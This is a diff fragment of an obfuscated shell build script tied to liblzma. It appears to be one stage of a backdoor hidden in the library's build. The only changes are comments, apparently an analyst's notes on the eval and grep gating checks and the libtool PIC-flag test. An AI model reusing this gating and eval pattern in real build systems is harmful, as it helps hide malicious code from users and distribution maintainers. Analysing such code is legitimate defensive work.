@@ -295,27 +295,30 @@ elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_
 	# Debug thing
 	eval $zrKcKQ
 
-	# Check (again) that is_arch_extension_supported eixsts in crc64_fast.c
+	# Check that is_arch_extension_supported eixsts in crc64_fast.c
 	if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
 		exit 0
 	fi
 
-	# Check (again) that is_arch_extension_supported eixsts in crc32_fast.c
+	# Check that is_arch_extension_supported eixsts in crc32_fast.c
 	if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
 		exit 0
 	fi
 
-	# Check (again) that is_arch_extension_supported eixsts in crc_x86_clmul.h
+	# Check that is_arch_extension_supported eixsts in crc_x86_clmul.h
 	if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
 		exit 0
 	fi
 
-	# Check (again) that __get_cpuid exists in crc_x86_clmul.h
+	# Check that __get_cpuid exists in crc_x86_clmul.h
 	if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
 		exit 0
 	fi
 
 	# Check for PIC flags in libtool (script)
+	#   for deb/rpm, this should be patched, is it a luck shot in other distros?
+	#   interestingly, it definitively isn't on Arch (it's -fPIC -DPIC)
+	#   maybe libtool is used as a check "if only the deb/rpm part in previous invocation worked correctly"
 	if ! grep -qs "$C" ../../libtool; then
 		exit 0
 	fi
